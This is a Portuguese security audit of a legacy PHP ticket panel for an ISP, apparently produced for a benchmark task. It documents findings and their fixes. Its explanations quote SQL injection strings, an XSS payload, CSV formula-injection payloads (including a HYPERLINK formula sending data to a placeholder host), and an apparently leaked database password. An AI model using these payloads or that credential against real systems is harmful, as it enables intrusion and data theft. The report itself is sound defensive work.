# RELATORIO — Painel de Chamados (NetX ISP)

**Instância:** LEB-100-A (nível 100, versão 1.1) · **Padrão:** LEB spec 1.1.0 · **Matriz:** `68088abdb7bc54fa949be972b5cf1f89c2c1c3c9f95b6e472385a6fa084c8625`

---

## 1. Resumo

O painel é um CRUD de chamados em PHP procedural (mysqli + HTML por concatenação), em produção desde 2013.
O esqueleto é pequeno e legível, mas **a camada de dados nunca implementou a regra de visibilidade
declarada no manifesto** e a entrada do usuário entrava crua em duas rotas: o termo de busca (SQL
injection) e o mesmo termo (XSS reflexivo). Some-se a isso o que costuma acompanhar um legado
de 13 anos: senha em MD5 sem sal, credencial de produção escrita no código-fonte, sessão sem
renovação, média de SLA com divisão por zero e export gravado dentro do diretório servido pelo web.

**O que foi corrigido (14 achados corrigidos):** SQL injection, controle de acesso ausente, XSS
reflexivo, hash de senha, segredo em código, divisão por zero, fixação/flags de sessão, escrita do
CSV (symlink), injeção de fórmula em CSV, tratamento de erro do mysqli, N+1 de consultas, validação
de tipos de entrada, cabeçalhos HTTP e papel de usuário desatualizado.

**O que foi reportado e deixado como está (4 achados):** falta de rate limit no login, rótulos de
prioridade, paginação/`SELECT *` e CSRF do login. Os motivos estão na seção **Decisões**.

**Compatibilidade.** Nenhuma assinatura pública foi alterada (`autenticar`, `formatarStatus`,
`rotuloPrioridade`, `listarChamados`, `verChamado`, `mediaResposta`, `exportarCsv` continuam com os
mesmos nomes, parâmetros, tipos e formato de retorno), nenhuma rota ou parâmetro GET mudou, o
cabeçalho e a ordenação do CSV continuam idênticos byte a byte e a tabela continua com
`id="tabela-chamados"` e as mesmas cinco colunas na mesma ordem. A regra de visibilidade foi
implementada **sem tocar nas assinaturas**, por um contexto de usuário (`ContextoPainel`) que os
scripts internos do ISP não definem — para eles o comportamento global é exatamente o de antes.

---

## 2. Achados (ordem de prioridade de correção)

### F1 — Injeção de SQL no termo de busca
**Onde:** `code/lib.php:82` (dentro de `listarChamados`, `code/lib.php:78-93`)
**Categoria:** segurança · **Severidade:** crítica · **Confiança:** 99/100

**Mecanismo.** O termo vinha do `$_GET['busca']` (`code/index.php:72`) e era concatenado direto na
consulta:

```php
$sql .= " WHERE titulo LIKE '%" . $busca . "%'";
```

Não há escape, nem prepared statement, nem validação. O usuário controla a string que fecha o
literal e continua a SQL: um termo `x' UNION SELECT ... -- ` troca a consulta inteira; um termo
`x%' OR '1'='1` devolve a tabela toda; `'; DROP TABLE chamados; --` executa DML/DDL conforme o privilégio do
usuário configurado em `DB_USER` (`painel`), que tem privilégio total sobre o schema do painel.
O caminho é curto e alcançável por qualquer visitante autenticado: a rota `index.php?busca=<termo>`
faz exatamente isso, e o formulário de busca da própria tela de listagem já envia o termo.

**Impacto.** Leitura arbitrária do banco (incluindo a tabela `usuarios`, com hashes de senha),
escrita/borragem de dados e, no pior caso, execução de comandos com o privilégio do usuário da
aplicação. É a primeira coisa a corrigir.

**O que foi feito.** A consulta passou a usar prepared statement com placeholder (`LIKE ?`), com o
termo escapado pelo helper `escaparLikeBusca()` (`!`, `%` e `_` escapados, `ESCAPE '!'`), de modo que
o usuário não consegue mais injetar SQL nem usar curingas para varrer a tabela. Verificado: as
cargas `'`/`UNION SELECT`/`OR '1'='1` retornam zero linhas e nenhum erro no log; a busca por `%`
agora é literal.

---

### F2 — Controle de acesso ausente: cliente enxerga os chamados de todos
**Onde:** `code/lib.php:78-93` (`listarChamados`), `code/lib.php:98-101` (`verChamado`),
`code/lib.php:123-150` (`exportarCsv`), `code/index.php:73`
**Categoria:** segurança · **Severidade:** crítica · **Confiança:** 100/100

**Mecanismo.** O manifesto define: *"Um cliente só pode ver os chamados que ele mesmo abriu. Um
técnico pode ver qualquer chamado."* Nenhum desses pontos filtrava por `usuario_id`. `listarChamados`
fazia `SELECT * FROM chamados` sem nenhum filtro; `verChamado` buscava por id apenas; o `index.php`
usava a sessão apenas para decidir *se* havia login (`code/index.php:20`), nunca *o que* a pessoa
pode ver. A coluna `chamados.usuario_id` existe (`code/schema.sql:14`) e é indexada
(`idx_usuario`), mas não era usada em nenhuma consulta. Como os papéis são gravados na sessão
(`code/index.php:39`) e nunca confrontados com o banco, o sistema se comportava como se todo
usuário logado fosse técnico.

**Impacto.** Com os dados de teste, `ana` (cliente) vê integralmente os chamados abertos por `bruno`
(troca de plano, fatura em duplicidade) e pode abrir qualquer um deles por `index.php?ver=<id>`,
lendo título e descrição. É vazamento de dados entre clientes e IDOR direto na rota de detalhe — e
o mesmo vazamentova para o CSV, que é o mesmo endpoint público.

**O que foi feito.** A regra de negócio foi implementada na camada de dados, sem alterar a
assinatura pública: a classe `ContextoPainel` (`code/lib.php:25-57`) guarda o usuário da requisição
e `condicaoVisibilidadeChamado()` (`code/lib.php:119-127`) devolve o filtro `usuario_id = ?`.
`listarChamados`, `verChamado`, `exportarCsv` e `mediaResposta` aplicam o filtro quando há contexto.
Somente o papel `tecnico` vê tudo — qualquer papel desconhecido é restrito (falha fechada). O
`index.php` define o contexto com o papel **relido do banco a cada requisição** (F18), logo uma
conta rebaixada ou removida perde o acesso imediatamente.

*Compatibilidade preservada:* os scripts internos do ISP (rotina noturna de exportação, relatório
gerencial) chamam `listarChamados($db)`/`exportarCsv($db)` sem definir contexto e, portanto,
continuam recebendo o conjunto completo — verificado byte a byte contra a implementação original.
Verificado no HTTP: `ana` vê apenas 101/102/105 e recebe "Chamado nao encontrado." ao pedir
`?ver=104` (chamado do `bruno`); `carla` (técnica) vê os 5.

---

### F3 — XSS reflexivo no termo de busca
**Onde:** `code/index.php:79` (atributo `value` do input) e `code/index.php:82` ("Resultados para")
**Categoria:** segurança · **Severidade:** alta · **Confiança:** 98/100

**Mecanismo.** O mesmo termo de busca era escrito na resposta sem escape:

```php
echo '<form method="get"><input name="busca" value="' . $busca . '" ...>'
echo '<p>Resultados para: ' . $busca . '</p>';
```

Como o valor vem da query string e é reescrito na mesma resposta, o atacante monta a URL
`index.php?busca="><script>...</script>` e o navegador da vítima executa o script no origin do
painel. O ponto de injeção dentro do atributo `value` ainda permite quebrar o atributo (`" onfocus=...`)
mesmo sem `<script>`. Não há CSP no sistema, então não há barreira secundária.

**Impacto.** Roubo de sessão (o cookie de sessão é o mesmo para o painel inteiro), requisições
forjadas com a identidade da vítima e leitura/modificação de dados pelo painel.

**O que foi feito.** `$busca` passa por `htmlspecialchars($busca, ENT_QUOTES, 'UTF-8')`
(`code/index.php:130`), reutilizado nos dois pontos de saída. O resto do HTML já usava
`htmlspecialchars` para `titulo`, `descricao` e `tecnico_nome`; esses pontos foram apenas
homogeneizados com `ENT_QUOTES`. Verificado: o payload `"><script>alert(1)</script>` volta
escapado (`&quot;&gt;&lt;script&gt;…`) e não executa.

---

### F4 — Senha de usuário armazenada em MD5 sem sal
**Onde:** `code/lib.php:15` (`$hash = md5($senha);`), com a coluna em `code/schema.sql:7`
(`senha CHAR(32)`)
**Categoria:** segurança · **Severidade:** alta · **Confiança:** 100/100

**Mecanismo.** `autenticar` transformava a senha em MD5 e comparava o resultado no banco
(`WHERE login = ? AND senha = ?`). MD5 é rápido e sem sal: um vazamento da tabela `usuarios` (trivial
com F1, ou com um dump) permite recuperar as senhas por rainbow table em segundos, e o mesmo MD5
(senha igual → hash igual) permite reutilização de credenciais entre clientes. O schema confirma o
formato (`CHAR(32)`).

**Impacto.** Recuperação em massa das senhas dos quatro usuários (e de qualquer cliente novo) a
partir de um dump do banco; reutilização de senhas de outros serviços.

**O que foi feito — migração sem travar ninguém.** `autenticar` passou a verificar de duas formas:
hash moderno (`password_verify`,Detectado pelo prefixo `$`) e, para as linhas legadas em MD5,
`hash_equals` sobre o MD5 (comparação em tempo constante). Quando um usuário legado entra com
sucesso, o hash é **reescrito no lugar** com `password_hash()`/`PASSWORD_DEFAULT` (bcrypt, custo 12),
de forma transparente. A reescrita só é tentada se a coluna já aceitar o tamanho do hash novo — a
verificação é feita em `information_schema.COLUMNS` (`code/lib.php:133-148`) —, de modo que uma
instalação antiga com `CHAR(32)` continua funcionando sem erro de "Data too long". O `schema.sql`
passou a `VARCHAR(255)` (`code/schema.sql:7`) para installs novas.
Verificado: login com senha MD5 legada funciona; o hash passa a `$2y$12$…`; em um schema antigo
(`CHAR(32)`) o login continua funcionando e o hash **não** é regravado (sem erro); senha errada
continua retornando `null`.

---

### F5 — Credenciais de produção dentro do código-fonte
**Onde:** `code/config.php:12` (`DB_PASS` com fallback `N3tX@2013!prod`) e `code/config.php:15`
(`SMTP_API_KEY` com valor literal `netx-smtp-…`)
**Categoria:** segurança · **Severidade:** alta · **Confiança:** 100/100

**Mecanismo.** A senha do banco e a chave da central de e-mail estavam escritas em texto claro no
arquivo versionado. Qualquer pessoa com leitura do repositório, backup do código, CI ou `git log`
obtém acesso ao banco de produção e à API transacional. O comentário da própria linha chamava o
fallback de "legado", indicando que ele era o caminho normal em produção.

**Impacto.** Acesso direto ao banco (o usuário `painel` tem privilégio total no schema) e à chave de
envio de e-mails; com o F5 combinado com o F1, um usuário autenticado do painel já alcançaria a
tabela `usuarios`.

**O que foi feito.** `config.php` agora resolve os segredos por `lerSegredoPainel()`: primeiro a
variável de ambiente (`DB_PASS`, `SMTP_API_KEY`), depois um arquivo de segredos gerenciado por
operações e **fora do docroot** (`LEB_SECRETS_FILE` ou `/etc/painel/secrets.env`, formato
`KEY=VALUE`), e por último o valor padrão vazio. Nenhum segredo fica mais no código-fonte. Se
`DB_PASS` não estiver provisionada, o sistema registra no log uma mensagem explícita dizendo o que
provisionar (sem expor valor) — falha de forma explícita em vez de silenciosamente tentar uma
credencial errada. **Requisito de implantação:** `DB_PASS` precisa estar no ambiente (ou no arquivo
de segredos) no primeiro start após o deploy.

---

### F6 — Divisão por zero na média de SLA
**Onde:** `code/lib.php:116` (`return $soma / $qtd;`)
**Categoria:** bug · **Severidade:** alta · **Confiança:** 95/100

**Mecanismo.** `mediaResposta` somava e contava as respostas em PHP e dividia no fim, sem tratar o
caso "nenhum chamado tem `minutos_resposta`". Com a tabela vazia — ou antes de o primeiro SLA ser
registrado — `$qtd` é 0. No PHP 8 isso não é mais um aviso: é `DivisionByZeroError`, exceção não
tratada, que aborta a requisição. `index.php:74` chama `mediaResposta` **em toda listagem**, ou
seja, o painel inteiro ficava indisponível, e não só o indicador de SLA.

**Impacto.** Erro 500 (página branca) na rota mais usada do sistema, no cenário mais comum de uma
instalação nova (nenhum SLA medido ainda) — e o relatório gerencial, que consome a mesma função,
quebraria da mesma forma.

**O que foi feito.** A média passou a ser calculada no banco (`AVG(...)`), que devolve `NULL` quando
não há linhas, e a função devolve `0.0` nesse caso (`code/lib.php:357-374`). O tipo de retorno
continua `float`. Verificado contra o código original: a versão antiga lança `DivisionByZeroError`
com a tabela vazia; a nova devolve `0.0` e a listagem renderiza normalmente.

---

### F7 — Fixação de sessão e cookie de sessão sem proteção
**Onde:** `code/index.php:15` (`session_start()` sem configuração) e `code/index.php:26`
(`header('Location: index.php')` logo após o login)
**Categoria:** segurança · **Severidade:** alta · **Confiança:** 95/100

**Mecanismo.** O login não renovava o identificador de sessão: o `PHPSESSID` emitido antes do login
continuava válido depois dele. Um atacante que consiga injetar um `PHPSESSID` conhecido na
navegação da vítima (por XSS, por um link com o cookie, ou por um proxy malicioso) fica autenticado
como a vítima. Além disso, `session_start()` era chamado sem `session_set_cookie_params()`, então o
cookie saía sem `HttpOnly` (legível por JavaScript, o que amplia o impacto do F3) e sem `SameSite`
(permitindo envio em requisições de terceiros).

**Impacto.** Sequestro de sessão e, em conjunto com o F3, roubo de cookie por script.

**O que foi feito.** `code/index.php:24-33`: cookie de sessão com `HttpOnly`, `SameSite=Lax` e
`Secure` quando a conexão é HTTPS, `session.use_strict_mode=1` e `session.use_only_cookies=1`. No
login bem-sucedido, `session_regenerate_id(true)` troca o identificador (F1 do capítulo de sessão:
o id **antes** e **depois** do login são diferentes — verificado). Foi acrescentado também expiração
por inatividade (`SESSION_TIMEOUT`, 7200s, em `code/config.php`), e o papel do usuário é relido do
banco a cada requisição (F18). Verificado: login → id de sessão rotacionado; cookie emitido com
`HttpOnly; SameSite=Lax`.

---

### F8 — Export gravado dentro do diretório servido pelo web, com escrita que segue link simbólico
**Onde:** `code/lib.php:125-126` (`$caminho = EXPORT_DIR . '/chamados.csv'; fopen($caminho, 'w')`)
e `code/lib.php:150` (`readfile($caminho)`)
**Categoria:** segurança · **Severidade:** alta · **Confiança:** 85/100

**Mecanismo.** O export escrevia num nome fixo dentro de `EXPORT_DIR` (`/var/www/painel/tmp`), que
está **dentro do docroot**. `fopen(..., 'w')` abre o caminho seguindo links simbólicos: se um
link simbólico `chamados.csv → /etc/passwd` (ou para um arquivo de configuração) existir no
diretório, o `fopen` trunca e sobrescreve o alvo — escrita arbitrária de arquivo com o privilégio
do usuário do web. Além disso, o arquivo com todos os chamados (incluindo os de outros clientes)
ficava legível por qualquer pessoa que alcançasse o diretório pela URL, e o `readfile()` lia o
caminho de novo, criando uma janela (TOCTOU) entre a escrita e a leitura. Se a gravação falhasse,
a função retornava silenciosamente e o navegador recebia uma resposta 200 **vazia**, sem CSV.

**Impacto.** Sobrescrita de arquivos arbitrários no servidor; vazamento de todos os chamados por
URL direta; download de CSV truncado sem qualquer indicação de erro.

**O que foi feito.** O CSV é gerado em memória (`php://temp`), a gravação em disco passa a ser
atômica e segura: `tempnam()` (cria arquivo único, modo 0600) → escrita → `chmod 0600` →
`rename()` sobre o destino (o `rename` substitui o próprio link simbólico, sem segui-lo). O
download responde o conteúdo em memória, sem `readfile` e sem TOCTOU. O caminho e o nome do
artefato em disco (`EXPORT_DIR/chamados.csv`) foram **mantidos**, porque a rotina noturna do ISP
consome esse arquivo. Se `EXPORT_DIR` não existir ou não for gravável, o download **continua
funcionando** (com log), em vez de responder vazio. Verificado: CSV idêntico byte a byte ao original
e arquivo gerado com modo `-rw-------`.
*Residual (decisão de infraestrutura):* o caminho padrão de `EXPORT_DIR` continua dentro do
docroot — ver **Decisões**.

---

### F9 — Injeção de fórmula nas células do CSV
**Onde:** `code/lib.php:138-144` (`fputcsv` com `$c['titulo']` cru)
**Categoria:** segurança · **Severidade:** média · **Confiança:** 85/100

**Mecanismo.** O título do chamado é digitado pelo cliente e vai cru para o CSV, que é aberto em
planilha (Excel/LibreOffice/Sheets). Uma célula iniciada por `=`, `+`, `-` ou `@` é interpretada
como fórmula: `=HYPERLINK("http://x/?"&A1,"clique")` vira um link clicável, `=cmd|'/C calc'!A0`
executa no Windows legado do Office e `=IMPORTXML(...)`/"DDE" pode vazar ou forçar requisições
externas. O mesmo vale para o nome do técnico.

**Impacto.** Ao abrir o export, o computador do gestor/técnico executa código definido por um
cliente (phishing interno, exfiltração por DDE, download de arquivo).

**O que foi feito.** `celulaCsvSegura()` (`code/lib.php:380-391`) prefixa com apóstrofo as células
que começam com caractere de fórmula, aplicado a `Titulo` e `Tecnico`. O placeholder `-` (chamado
sem técnico) foi preservado intacto, e a saída dos dados de teste continua byte a byte igual à
original. Verificado: título `=CMD|calc!A1` sai como `'=CMD|calc!A1`.

---

### F10 — Falha do mysqli vira erro fatal com stack trace
**Onde:** `code/lib.php:85` (`$res = $db->query($sql)` sem checar), `code/index.php:9-12`
(`new mysqli(...)` + `if ($db->connect_errno)`)
**Categoria:** bug · **Severidade:** média · **Confiança:** 85/100

**Mecanismo.** Desde o PHP 8.1 o modo padrão do mysqli é `MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT`:
falha de consulta **lança** `mysqli_sql_exception`, em vez de devolver `false`. Ou seja, o
`if ($res === false)` que existia em `exportarCsv` era código morto, e uma consulta malsucedida
vaza uma exceção não tratada — erro fatal 500 com stack trace (caminhos internos, SQL, em
`display_errors` ligado, tudo na resposta). O mesmo vale para a conexão: o `connect_errno` nunca é
verificado, porque o construtor lança antes. Uma queda do banco derrubava o painel inteiro em vez
de degradar.

**Impacto.** Página 500 com informação interna exposta em qualquer erro de SQL (inclusive erro de
sintaxe alguém introduzido na string concatenada do `LIKE`), em vez de degradação graciosa.

**O que foi feito.** `executarConsulta()` (`code/lib.php:66-90`) encapsula prepare/execute/query em
`try/catch (mysqli_sql_exception)`, registra o erro no log do servidor e devolve `null`; os
chamadores trata `null` (lista vazia, `null` no detalhe, `0.0` na média, CSV ainda entregue). A
conexão em `index.php:12-18` passou a ser criada dentro de `try/catch`, com mensagem de erro
inalterada ("Falha ao conectar ao banco.") e log do motivo real. Verificado: nenhuma exceção
escapou nos testes (log sem warnings/errors).

---

### F11 — N+1 de consultas na listagem e no export
**Onde:** `code/lib.php:89` (`tecnicoNome()` dentro do laço da listagem) e `code/lib.php:137`
(mesma chamada dentro do laço do export)
**Categoria:** performance · **Severidade:** média · **Confiança:** 95/100

**Mecanismo.** `listarChamados` fazia `SELECT * FROM chamados` e, para **cada** linha, uma nova
consulta `SELECT nome FROM usuarios WHERE id = …`. Com N chamados, são N+1 idas ao banco por
renderização de página; o export repetia o padrão (N+1). Em um painel com alguns milhares de
chamados, listar uma página custa milhares de round-trips — o custo cresce linearmente com o
volume e com o número de usuários conectados simultaneamente.

**Impacto.** Latência da listagem e do export proportional ao volume; consumo de conexões do pool
(mysqli éblocking, uma conexão por processo) e load de banco desnecessário.

**O que foi feito.** A listagem passou a resolver o técnico com um único `LEFT JOIN`
(`COALESCE(u.nome, ?) AS tecnico_nome`), eliminando o N+1, e o export usa um cache por requisição em
`tecnicoNome()` (`code/lib.php:265-284`), que consulta cada técnico uma única vez. O conjunto de
chaves devolvido por `listarChamados` continua idêntico ao original (verificado campo a campo,
incluindo os tipos: a função `normalizarValoresLinha()` reconverte para string, porque consultas
preparadas devolvem `int` enquanto o `query()` legado devolvia string — diferença invisível para o
consumidor, mas que quebraria `=== '105'`).

---

### F12 — Sem paginação e `SELECT *` traz a descrição de todos os chamados
**Onde:** `code/lib.php:80` (`$sql = 'SELECT * FROM chamados';`)
**Categoria:** performance · **Severidade:** baixa · **Confiança:** 85/100

**Mecanismo.** A listagem carrega a tabela inteira em memória, com todas as colunas — inclusive
`descricao` (TEXT), que não é usada na listagem — e sem nenhum `LIMIT`. O volume cresce sem
limite; o custo de memória e o tempo de resposta escalam com a tabela inteira, e o painel fica
progressivamente mais lento conforme o histórico de chamados cresce.

**Impacto.** Degradação progressiva do painel (e do relatório que usa a mesma função); pico de
memória do processo PHP.

**O que foi feito / não foi feito.** **Não foi corrigido** — ver **Decisões** (paginação exigiria
novos parâmetros de rota e alteraria a forma da saída; remover colunas pode quebrar consumidores que
leem `descricao` do array devolvido).

---

### F13 — Tentativas de login ilimitadas
**Onde:** `code/lib.php:13` (`autenticar`), `code/index.php:21` (bloco de login)
**Categoria:** segurança · **Severidade:** média · **Confiança:** 90/100

**Mecanismo.** Não há rate limit, bloqueio progressivo nem registro de tentativas: o formulário de
login aceita requisições ilimitadas. `autenticar` consulta o banco a cada tentativa, o que por si
só é um desgaste menor, mas as senhas em MD5 (F4) tornavam o alvo trivial — e o hash agora é
bcrypt, o que é lento por desenho (custo 12) e, sem limite de tentativas, permite um
*DoS* de CPU/sessão por cálculo de hash.

**Impacto.** Força bruta de credenciais (principalmente contra as 4 contas de cliente) e consumo
de CPU para negação de serviço via login.

**O que foi feito / não foi feito.** **Não foi corrigido** — ver **Decisões** (o bloqueio
precisa de armazenamento compartilhado entre processos, que a stack atual não tem, e um limite
mal calibrado quebra clientes legítimos).

---

### F14 — `rotuloPrioridade` confunde prioridades e rebaixa chamado crítico
**Onde:** `code/lib.php:40-59`
**Categoria:** qualidade · **Severidade:** baixa · **Confiança:** 80/100

**Mecanismo.** A função decide o rótulo a partir de `minutos_resposta` (tempo até a **primeira**
resposta) e da prioridade, mas com três problemas de semântica: (a) `prioridade` 1 ("baixa") e 2
("normal") caem no mesmo ramo e devolvem `"Normal"` — o painel nunca mostra "baixa"; (b) quando
`minutos_resposta <= 30`, uma prioridade 4 ("crítica", cf. `code/schema.sql:19`) devolve
`"Alto - dentro do SLA"`, rebaixando um chamado crítico para "Alto"; (c) o SLA é medido só até a
primeira resposta, mas o rótulo continua sendo exibido em chamados resolvidos, como se
"dentro do SLA" fosse o estado atual do chamado.

**Impacto.** O painel (e o relatório que reaproveita os rótulos) classifica errado: um chamado
crítico aparece como "Alto", e a distinção baixa/normal não existe. Não quebra o contrato do
manifesto, que fixa apenas os rótulos de **status**.

**O que foi feito / não foi feito.** **Não foi corrigido** — ver **Decisões** (os textos de
prioridade não estão no manifesto, mas são reaproveitados por consumidores internos que fazem
correspondência por texto).

---

### F15 — Parâmetros de requisição sem validação de tipo
**Onde:** `code/index.php:22` (`autenticar($db, $_POST['login'], …)`), `code/index.php:53`
(`(int) $_GET['ver']`), `code/index.php:72` (`$busca = $_GET['busca'] ?? ''`)
**Categoria:** bug · **Severidade:** baixa · **Confiança:** 90/100

**Mecanismo.** `$_GET` e `$_POST` podem ser arrays (`?busca[]=x`). Em `$_POST['login']` isso
estourava o `TypeError` da assinatura `string $usuario` (erro fatal 500 em vez de "usuário
inválido"); em `$_GET['ver']`, o cast `(int)` de um array resultava em **1**, ou seja,
`?ver[]=x` abria o chamado de id 1 — comportamento silenciosamente errado; em `$_GET['busca']`, um
array chegava como array em `listarChamados(mysqli, string)` e causava `TypeError`.

**Impacto.** Erros 500 em requisições malformadas (negação de serviço trivial) e, no caso de
`?ver[]=x`, desvio silencioso para o registro errado.

**O que foi feito.** Validação de escalaridade e coerção explícita em `code/index.php:57-59`,
`code/index.php:109` e `code/index.php:129`; `?ver[]=x` agora resolve para id 0 e cai em
"Chamado nao encontrado." Verificado: `?busca[]=x` e `?ver[]=x` respondem 200 sem erro no log.

---

### F16 — Formulário de login sem token CSRF
**Onde:** `code/index.php:21-34`
**Categoria:** segurança · **Severidade:** baixa · **Confiança:** 85/100

**Mecanismo.** O `POST` de login não exige token anti-CSRF. Um site externo pode mandar um formulário
que faz o navegador da vítima "entrar" no painel com as credenciais do atacante (*login CSRF*),
deixando a sessão da vítima autenticada em uma conta controlada pelo atacante — útil para
capturar ações feitas depois (o corpo do painel é exibido como se fosse da vítima).

**Impacto.** Baixo, isolado: exige que a vítima já esteja autenticada no painel e não executa
nenhuma ação destrutiva por conta própria.

**O que foi feito / não foi feito.** **Não foi corrigido** — ver **Decisões** (exigir token
quebraria clientes de automação que fazem login por script; o risco foi mitigado com a renovação de
sessão e flags de cookie do F7).

---

### F17 — Cabeçalhos HTTP de segurança ausentes
**Onde:** `code/index.php:30` (primeiro `echo` da resposta — nenhum cabeçalho é enviado antes dele)
**Categoria:** segurança · **Severidade:** baixa · **Confiança:** 85/100

**Mecanismo.** A resposta não traz `X-Content-Type-Options`, `X-Frame-Options` nem
`Referrer-Policy`. Sem `nosniff`, o navegador pode interpretar a resposta como HTML em contextos
onde o tipo declarado não deveria renderizar; sem `X-Frame-Options`, o painel pode ser embutido em
`iframe` por um site externo (clickjacking sobre a tela de login); sem `Referrer-Policy`, a URL de
busca — que pode conter dados digitados pelo cliente — vaza para sites de terceiros.

**Impacto.** Baixo isoladamente; aumenta o impacto de outros achados (F3, F16).

**O que foi feito.** `code/index.php:35-39` envia `X-Content-Type-Options: nosniff`,
`X-Frame-Options: SAMEORIGIN` e `Referrer-Policy: no-referrer` em todas as respostas. A resposta do
CSV mantém seu `Content-Type`/`Content-Disposition` e ganha `nosniff` (`code/lib.php:478-483`).

---

### F18 — Papel do usuário só existia na sessão
**Onde:** `code/index.php:38-39` (`$papel = $_SESSION['papel'];`)
**Categoria:** arquitetura · **Severidade:** baixa · **Confiança:** 80/100

**Mecanismo.** O papel vinha da sessão, escrita no login, e era usado como se fosse a verdade. Um
usuário rebaixado de `tecnico` para `cliente` (ou removido do banco) continuava com o papel antigo
até a sessão expirar — e o papel era exatamente o que decidiria (depois do F2) o que a pessoa
enxerga. Com o F2 corrigido, essa defasagem passou a ter consequência real de acesso.

**Impacto.** Autorização baseada em dado obsoleto; conta removida mantinha acesso até o fim da sessão.

**O que foi feito.** O `index.php` agora relê o usuário do banco a cada requisição
(`carregarUsuarioPainel`, `code/lib.php:153-161`); se a conta não existir mais, a sessão é
destruída e a tela de login aparece. O papel usado no filtro de visibilidade é sempre o do banco.

---

## 3. Decisões — o que deliberadamente **não** mudei

| # | O que ficou como está | Por quê |
| --- | --- | --- |
| D1 | **Paginação / `LIMIT` na listagem** (F12) | O manifesto não declara paginação e a rota `index.php` não tem parâmetro de página; introduzi-la mudaria a forma da saída e exigiria parâmetros novos. Também não removi `descricao` do `SELECT *`: consumidores do array podem ler essa chave. Alternativa futura: paginação por `?pagina=` mantendo o padrão atual como página 1. |
| D2 | **Rate limit no login** (F13) | Não há armazenamento compartilhado na stack (sessão é por processo/cliente), e um limite mal calibrado bloquearia clientes legítimos e quebraria testes de login automatizado. Mitigação parcial: o hash bcrypt (F4) encarece o ataque de CPU. Próximo passo natural: contador em tabela (`usuarios.tentativas`/`login_tentativas`) ou no servidor web. |
| D3 | **Textos de `rotuloPrioridade`** (F14) | Os rótulos de *status* estão no manifesto; os de *prioridade*, não — mas são reaproveitados por consumidores internos que casam por texto, e o relatório gerencial não é código que eu possa ver. Corrigir o significado ("Baixa" para prioridade 1, "CRITICO" mesmo dentro do SLA) mudaria strings fora do contrato declarado. Preferi reportar. |
| D4 | **Token CSRF no login** (F16) | O manifesto fixa as rotas e nomes de parâmetro, e há consumidores que autenticam por script (rotina noturna, integração de faturamento). Exigir token tornaria esses clientes inválidos. O risco é baixo (login CSRF não executa ação por conta própria) e foi parcialmente mitigado por F7 (renovação de sessão, cookie `HttpOnly`/`SameSite`). |
| D5 | **Caminho padrão de `EXPORT_DIR` dentro do docroot** (F8) | Mover o diretório padrão muda onde a rotina noturna do ISP busca o `chamados.csv` — um consumidor que não está no pacote. O caminho **continua o mesmo** e agora pode ser redirecionado sem tocar em código, pela variável de ambiente `EXPORT_DIR` (implementada em `code/config.php`). A mudança efetiva é de infraestrutura (mover para fora do docroot), não de código — fica como recomendação operacional. |
| D6 | **CSRF nas operações de escrita** | O sistema não tem escrita de dados (só leitura e export); o único POST é o login. Nada a proteger além de F16. |
| D7 | **Estrutura de HTML por concatenação / ausência de templates** | Reescrever a camada de apresentação seria reescrita, não evolução, e a estrutura HTML da listagem é declarada no manifesto (`id="tabela-chamados"`, ordem das colunas). Mantive a construção por `echo` como está. |
| D8 | **Troca de camada de dados / de framework / novas dependências** | Proibido pelo enunciado e pela assinatura pública (`mysqli`). Nenhuma dependência nova foi adicionada: só `password_hash`/`password_verify` (nativos do PHP) e `prepared statements` do mysqli. |
| D9 | **Seed com hash MD5** (`code/seed.sql`) | Mantido de propósito: é o que exercita o caminho legado da migração (F4) e preserva o ambiente de teste declarado no manifesto. Instalações novas recebem o hash moderno assim que o usuário entra pela primeira vez. |
| D10 | **Assinaturas das funções públicas** | Nenhuma foi alterada — nem com parâmetros opcionais novos. A regra de visibilidade entrou pelo contexto (`ContextoPainel`), e os scripts internos, que não definem contexto, continuam com a visão global. Verificado byte a byte contra a implementação original. |

---

## 4. Verificação executada

Ambiente: PHP 8.4.26 (extensão mysqli) + MariaDB 11.8 em container local, com o `code/` servido
pelo servidor embutido do PHP; banco montado a partir do `code/schema.sql` + `code/seed.sql`
delivered, e um segundo banco com o schema **antigo** (`CHAR(32)`) para checar a compatibilidade da
migração de senha.

| Verificação | Resultado |
| --- | --- |
| `php -l` nos 3 arquivos | sem erros de sintaxe |
| Login `ana`/`senha123`, `carla`/`tecmaster`, senha errada | 302 + sessão; senha errada volta à tela de login |
| Visibilidade — cliente | `ana` vê 101/102/105 (só os dela); `?ver=104` → "Chamado nao encontrado." |
| Visibilidade — técnico | `carla` vê os 5; `?ver=<id>` de qualquer cliente funciona |
| Export CSV | cabeçalho `ID,Titulo,Status,Tecnico,Aberto em` exato; ordenação por `id`; status com os rótulos do manifesto; saída **byte a byte igual** à implementação original (sem contexto e como técnico) |
| CSV da rota web | cliente exporta apenas os chamados que pode ver; técnico exporta todos |
| Artefato em disco | `EXPORT_DIR/chamados.csv` gerado, modo `-rw-------` |
| SQL injection | `'`/`OR '1'='1`/`UNION SELECT` → 0 linhas, sem erro no log |
| XSS reflexivo | payload `"><script>alert(1)</script>` escapado no `value` e no texto |
| MIME/erro de tipo | `?busca[]=x` e `?ver[]=x` → 200, sem warning/fatal |
| Sessão | id **rotacionado** no login; cookie com `HttpOnly; SameSite=Lax` |
| Hash de senha | login legado (MD5) → hash passa a `$2y$12$…`; schema antigo `CHAR(32)` → login funciona e o hash **não** é regravado |
| Média de SLA sem respostas | versão original: `DivisionByZeroError`; versão entregue: `0.0` e painel renderiza |
| Comparação de retorno | `listarChamados`/`verChamado`/`exportarCsv` comparados com a implementação original: **idênticos** em chaves, tipos e valores |

---

## 5. Recomendações para a operação (fora do escopo do código)

1. **Provisionar `DB_PASS`** (e `SMTP_API_KEY`) no ambiente do painel — ou em
   `/etc/painel/secrets.env` — antes do deploy; o código não tem mais nenhum segredo embutido.
2. **Rotacionar** a senha do banco e a chave SMTP expostas no código-fonte original.
3. **`ALTER TABLE usuarios MODIFY senha VARCHAR(255) NOT NULL;`** no banco já implantado, para
   habilitar a migração automática do hash (sem isso o sistema continua funcionando, mas as senhas
   permanecem em MD5 até a migração da coluna).
4. **Mover `EXPORT_DIR`** para fora do docroot (ex.: `/var/lib/painel/tmp`), ajustando a rotina
   noturna que lê `chamados.csv`.
5. **Rate limit no login** no servidor web (ou em tabela), conforme D2.
